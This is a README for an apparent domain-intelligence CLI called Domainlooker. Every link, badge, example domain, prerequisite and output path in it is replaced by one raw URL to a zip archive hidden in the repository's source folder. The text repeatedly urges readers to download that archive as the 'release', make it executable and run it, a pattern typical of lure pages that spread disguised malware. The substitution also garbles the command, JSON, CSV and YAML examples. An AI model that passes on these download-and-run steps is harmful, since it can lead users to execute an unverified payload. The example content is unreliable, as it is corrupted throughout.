https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip

# Domainlooker: Fast CLI for Domain Intelligence, DNS, SSL & Analysis

[![Release](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip%20Latest-Release-blue?logo=github&logoColor=fff)](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip)
[![Built with TypeScript](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip%20with-TypeScript-3178C6?logo=typescript&logoColor=fff)](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip)
[![License](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip%20Source-4CC9F0?logo=github)](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip)

🕵️ Domainlooker is a fast and reliable command line tool for domain intelligence. It collects WHOIS data, DNS records, SSL certificate details, performs network analysis, discovers subdomains, and exports results in API-friendly formats. This tool is designed for security researchers, threat analysts, and network operators who need a compact, repeatable way to gather domain intelligence.

- Topics: cli-tool, cybersecurity, dns, domain-analysis, network-scanning, security-research, ssl, subdomain-discovery, typescript, whois

Emoji-powered overview
- 🧭 Explore domain data from multiple sources in one run
- 🔎 Resolve DNS, query WHOIS, inspect SSL certs
- 🧰 Analyze network reachability and topology
- 🗂️ Export data in JSON, CSV, or YAML for pipelines
- 🚀 Lightweight, fast, and scriptable

Why Domainlooker matters
- It reduces the time to gather critical domain intelligence.
- It provides a single export format suitable for SIEMs, threat intel feeds, or incident response playbooks.
- It supports repeatable workflows so you can reproduce findings across your team.

Table of contents
- Why use Domainlooker
- Core features
- Getting started
- Installation
- Quick start guide
- Command reference
- Data export formats
- Data model and sample outputs
- Configuration and presets
- Workflows and use cases
- Extending with plugins
- Security considerations
- Testing and quality assurance
- Documentation and support
- Roadmap
- Contributing
- FAQ
- License
- Acknowledgments

Why use Domainlooker
Domainlooker gives you a compact, focused set of capabilities for domain intelligence. It brings together critical data sources and presents them in a consistent structure. You can run a full analysis on a domain in a single command, then export the result for automation or further analysis.

Core features
- WHOIS lookups with registrar data, registrant hints, and important timestamps
- DNS discovery and validation, including A, AAAA, MX, NS, TXT, CNAME, and SOA records
- SSL/TLS insight from the domain’s certificates, including issuer, validity window, and subject alt names
- Network analysis to gauge reachability and potential exposure, including port checks and basic traceroute-like traces
- Subdomain discovery using multiple techniques, such as DNS brute-forcing, recursive lookups, and intelligent heuristics
- API-ready exports with a stable, machine-friendly JSON schema
- Optional output formats: JSON, CSV, YAML
- Portable CLI with cross-platform binaries
- Small footprint and fast execution for rapid triage

Getting started
Domainlooker is designed to be simple to install and easy to use. You can either install from a package manager, build from source, or download a pre-built binary from the releases page. When you start, you get a concise summary of the domain’s data and a structured export you can feed into your pipeline.

Notes about the releases page
The project releases page contains ready-to-run binaries for different platforms. For Linux, macOS, and Windows, download the appropriate asset, extract it, and run the binary. The releases page is the best place to get the latest stable version and security updates. Visit https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip to pick the asset that matches your environment.

- If you want the latest release, head to the releases page and grab the right asset for your OS. The asset naming typically looks like domainlooker-<version>-<os>-<arch>.<ext>.
- After download, extract, then run the executable from your shell. On Unix-like systems you will usually need to set executable permissions (chmod +x domainlooker). Then you can invoke it directly as domainlooker.
- If you are just evaluating, you can also install via a package manager if you prefer, but binaries from releases are often the quickest path to a full-featured, up-to-date tool.

Installation
Choose the path that fits your workflow.

Option 1: Install from npm (preferred for rapid setup on some platforms)
- Prerequisites: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip 18+ is recommended.
- Install: npm install -g domainlooker
- Verify: domainlooker --version
- Quick check: domainlooker --help

Option 2: Build from source (for contributors or custom builds)
- Prerequisites: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip 18+, npm or yarn
- Clone the repository locally
- Install dependencies: npm install
- Build the CLI: npm run build
- Run from local build: node https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --help

Option 3: Download pre-built binaries (fastest for usage)
- Go to the releases page: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
- Download the asset for your platform, extract, and run the binary
- On Linux/macOS, ensure the file has execute permission and run it:
  - chmod +x domainlooker
  - ./domainlooker --help
- On Windows, extract and run https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip from a command prompt
- After installation, you can invoke Domainlooker with a domain name as the target:
  domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --network --subdomains --export json --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip

Getting started: a quick demo
- Pick a domain you trust for testing (for example, https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip).
- Run a comprehensive scan with a single command:
  domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --network --subdomains --export json --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
- Inspect the results in the resulting file. You will see sections for whois, dns, ssl, network, and subdomains, each with structured data ready for programmatic consumption.

Quick start guide
- Basic usage
  - domainlooker <domain> [options]
  - You can enable or disable modules with flags:
    --whois, --dns, --ssl, --network, --subdomains
  - Example:
    domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --subdomains --export yaml --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
- Output formats
  - json, csv, yaml
  - When you supply --export, you choose a format, and Domainlooker will write to the specified output file if given, or to stdout if not.
- Export targets
  - API-ready exports are structured to map to common data models used in threat intel, incident response, and security operations workflows.
  - You can feed these exports into SIEMs, threat intelligence platforms, or simple CSV/JSON readers.

Command reference (high level)
- domainlooker help
  - Prints a concise usage guide and a summary of available options.
- domainlooker <domain> --whois
  - Fetches WHOIS data for the domain and enriches it with registrar and date information.
- domainlooker <domain> --dns
  - Queries DNS and returns A/AAAA/MX/NS/SOA/TXT/CNAME records along with TTLs and resolvers used.
- domainlooker <domain> --ssl
  - Retrieves SSL/TLS certificate data from the domain, including issuer, validity, and SANs.
- domainlooker <domain> --network
  - Performs basic network checks and topology insights, such as reachable hosts and port visibility.
- domainlooker <domain> --subdomains
  - Runs multiple strategies to discover subdomains and aggregates findings.
- domainlooker <domain> --export <format>
  - Exports the collected data into json, csv, or yaml.
- domainlooker <domain> --output <path>
  - Writes the export to a file. If omitted, prints to stdout.

Data export formats (examples)
- JSON example
{
  "domain": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip",
  "tld": "com",
  "whois": {
    "registrar": "Example Registrar",
    "creationDate": "1995-01-01",
    "updatedDate": "2020-01-01",
    "expirationDate": "2030-01-01",
    "registrant": {
      "name": "Example Person",
      "organization": "Example Org"
    }
  },
  "dns": {
    "records": [
      {"type": "A", "name": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "value": "93.184.216.34", "ttl": 3600},
      {"type": "MX", "name": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "value": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "priority": 10, "ttl": 3600}
    ]
  },
  "ssl": {
    "certIssuer": "Let's Encrypt",
    "validFrom": "2024-01-01T00:00:00Z",
    "validTo": "2025-01-01T00:00:00Z",
    "subjectAltNames": ["https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip"]
  },
  "network": {
    "reachable": true,
    "openPorts": [80, 443],
    "policyHints": ["https only"]
  },
  "subdomains": [
    "www",
    "mail",
    "dev"
  ]
}
- CSV example
domain,tld,whois_registrar,ssl_issuer,open_ports,subdomains
https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip,com,"Example Registrar","Let's Encrypt","80|443","www;mail;dev"

- YAML example
domain: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
tld: com
whois:
  registrar: Example Registrar
  creationDate: 1995-01-01
  updatedDate: 2020-01-01
  expirationDate: 2030-01-01
  registrant:
    name: Example Person
    organization: Example Org
dns:
  records:
    - type: A
      name: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
      value: 93.184.216.34
      ttl: 3600
ssl:
  certIssuer: Let's Encrypt
  validFrom: 2024-01-01T00:00:00Z
  validTo: 2025-01-01T00:00:00Z
  subjectAltNames:
    - https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
    - https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
network:
  reachable: true
  openPorts:
    - 80
    - 443
  policyHints:
    - https only
subdomains:
  - www
  - mail
  - dev

Data model and normalization
- The data model is designed to be stable across releases to support automation.
- Fields are named consistently and nested to reflect data provenance.
- The schema supports easy mapping to common security tools, threat intel formats, and incident response playbooks.
- If a piece of data is missing, the corresponding field reflects that with null or an empty array, rather than causing a parsing error downstream.

Configuration and presets
- You can customize behavior with a configuration file and per-run presets.
- Common options to consider:
  - timeout: how long each module should wait for responses
  - dnsResolvers: a list of DNS servers to query
  - subnetScope: limit subdomain discovery to a specific network range
  - excludeModules: disable specific modules for lean runs
  - exportFormat: default export format if not specified on the command line
- Example config (https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip):
{
  "timeout": 5000,
  "dnsResolvers": ["1.1.1.1", "9.9.9.9"],
  "subnetScope": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip",
  "excludeModules": ["network"],
  "exportFormat": "json"
}
- You can override the config on a per-run basis with command-line flags.

Workflows and use cases
- Rapid triage after a new domain is observed
  - Collect WHOIS, DNS, SSL data to form a quick risk assessment
  - Discover subdomains for potential footholds or leakage
  - Export to JSON for SIEM ingestion or ticketing systems
- Threat intel pipeline
  - Schedule regular scans for a portfolio of domains
  - Normalize exports to feed threat intel analytics dashboards
  - Compare changes across runs to detect anomalies
- Security research and incident response
  - Investigate suspicious domains by gathering multi-source intelligence
  - Produce a compact report with actionable details
  - Save results for post-incident reviews and evidence packages

Extending with plugins
- Domainlooker includes a lightweight plugin interface to extend data sources and export formats
- Plugins can implement new data collectors (for example, a custom DNS provider) or new exporters (for a local database, message queues, or threat intel formats)
- Plugin architecture goals
  - Simplicity: plugin authors should be able to implement a small interface
  - Safety: plugins run in a controlled environment and cannot affect core stability
  - Compatibility: plugins should be portable across platforms supported by the core binary
- How to add a plugin (high level)
  - Implement a defined interface for data sources or exporters
  - Register the plugin with the core at startup
  - Build and distribute a plugin package compatible with your Domainlooker version
- Example plugin ideas
  - Passive DNS data collector that queries additional public data sources
  - PCB-friendly SSH-based data fetcher for internal networks
  - Custom report exporter to a database or data lake

Configuration and presets in depth
- The configuration system is designed to be human-friendly and machine-friendly
- YAML or JSON formats are supported for configuration
- You can define environment-specific presets to reuse across teams
- Example preset for a fast triage run:
{
  "timeout": 2000,
  "dnsResolvers": ["1.1.1.1", "8.8.8.8"],
  "exportFormat": "csv",
  "excludeModules": ["network"]
}
- Running with a preset
  domainlooker --preset fast-triage https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip

Security considerations
- Domainlooker handles data that may include sensitive domain ownership information
- Data is stored locally unless you explicitly choose to export to a network location
- When running in a shared environment, ensure file permissions prevent other users from accessing export files
- Be mindful of rate limits and terms of service of external providers when performing mass lookups
- Regularly update Domainlooker to benefit from security fixes and data source improvements

Testing and quality assurance
- The project includes unit tests that cover core data collectors and export logic
- Tests verify the stability of data normalization and export schemas
- Continuous integration runs tests on multiple platforms to ensure cross-platform compatibility
- You can run tests locally with npm test or the project’s preferred test command
- If you encounter a bug, add a test that reproduces the issue and submit a pull request with a fix and updated tests

Documentation and support
- The repository includes a user guide and API reference in addition to this README
- For model changes, consult the changelog and release notes
- Community support is available through issues, discussions, and pull requests
- You can search for common questions in the FAQ section or open a new issue to ask for help

Roadmap
- Short-term goals
  - Expand DNS providers for more robust results
  - Add more robust SSL certificate analysis, including OCSP status
  - Improve subdomain discovery with more heuristics and data sources
- Mid-term goals
  - Build a richer exporter ecosystem with schema adapters for popular threat intel platforms
  - Improve performance with parallel data collectors and streaming exports
- Long-term goals
  - Integrate with secure sandboxes for plugin execution
  - Support additional formats like Protobuf or Parquet for large-scale pipelines

Changelog (high level)
- v1.x.x
  - Initial release with WHOIS, DNS, SSL, network, and subdomain discovery
  - API-ready JSON export
  - Cross-platform binaries
- v1.y.y
  - Improved DNS resolution reliability
  - Added CSV and YAML export options
  - Subdomain discovery improvements and caching
- v2.0.0 (major)
  - Overhauled data model for consistency and extensibility
  - Plugin framework introduced
  - Configuration presets and environment-specific profiles
- v2.x.x
  - Performance improvements and better error handling
  - Enhanced SSL certificate analysis
  - Expanded documentation and examples

Contributing
- We welcome pull requests, issue reports, and feedback
- How to contribute
  - Fork the repository
  - Create a feature branch
  - Implement changes with tests
  - Run the test suite to verify
  - Open a pull request with a clear description of the change
- Code style and guidelines
  - Use clear, direct language in code comments
  - Write tests that cover edge cases
  - Keep changes focused and cohesive
- Code of Conduct
  - The project follows a standard community code of conduct to ensure a welcoming environment

FAQ
- What platforms does Domainlooker support?
  - Linux, macOS, and Windows are supported via pre-built binaries and source builds
- How do I export results for automation?
  - Use the --export option with json, csv, or yaml and provide an output path
- Can I customize what data Domainlooker collects?
  - Yes, you can enable or disable modules and provide presets through configuration
- Are there rate limits?
  - Some sources may impose rate limits; use conservative timeouts and resolvers to avoid being blocked
- How do I report a bug?
  - Open an issue with a clear description, steps to reproduce, and any relevant logs

License
- Domainlooker is open source and released with a permissive license
- You are free to use, modify, and distribute the software in your own projects

Acknowledgments
- Thanks to the early adopters and contributors who tested the tool in real environments
- Appreciation for the security researchers who helped refine data collection and export formats

Note on links
- The releases page is the primary source of official binaries and updated assets. For the latest stable release, visit the releases page: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
- If you need to download a specific asset, go to the same releases page and pick the asset that matches your OS and architecture. The page provides the exact asset names and download instructions. This page is the best place to obtain the file you will execute on your system.

Images and visuals
- The README uses a variety of visuals to convey information clearly.
- A consistent set of icons is used to represent topics like DNS, SSL, and whois.
- You can customize visuals by adding more illustrations or diagrams relevant to your environment.
- For quick visual cues, badges from https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip are included to indicate language, platform, and release status.

Appendix: sample walkthrough (end-to-end scenario)
- Scenario: A security analyst needs to perform a quick triage on a newly observed external domain
  - Step 1: Install Domainlooker if not present
    - Option A: Download the asset for Linux from the releases page and run it
    - Option B: Install via npm if you use https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip regularly
  - Step 2: Run a full-domain triage
    - Command:
      domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --subdomains --export json --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
  - Step 3: Inspect the results
    - Browse https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip to find the registrar, DNS health, TLS status, and discovered subdomains
  - Step 4: Feed the results into your incident response workflow
    - Use the JSON export to import into your warning dashboards or SIEM
  - Step 5: Extend for ongoing monitoring
    - Create a schedule using your preferred automation tool to re-run Domainlooker on a daily or weekly cadence
- Scenario: Research team prepares threat intel reports
  - Use a preset for comprehensive data collection
  - Export in CSV for quick ingestion into spreadsheets
  - Use plugin interfaces to add a data source not included by default
  - Include a short narrative with the core data for executive summaries

Closing notes
- Domainlooker is designed to be straightforward to install and simple to use for daily investigations while still offering deep detail when you need it
- The tool emphasizes clean, consistent outputs that are easy to automate and integrate into larger workflows
- If you need more, you can contribute to the project or request features through the issue tracker

Releases reference
- For the latest stable releases, visit the releases page:
  https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip

Downloads and assets reference
- To download the appropriate asset for your system, go to the same releases page:
  https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip

End of document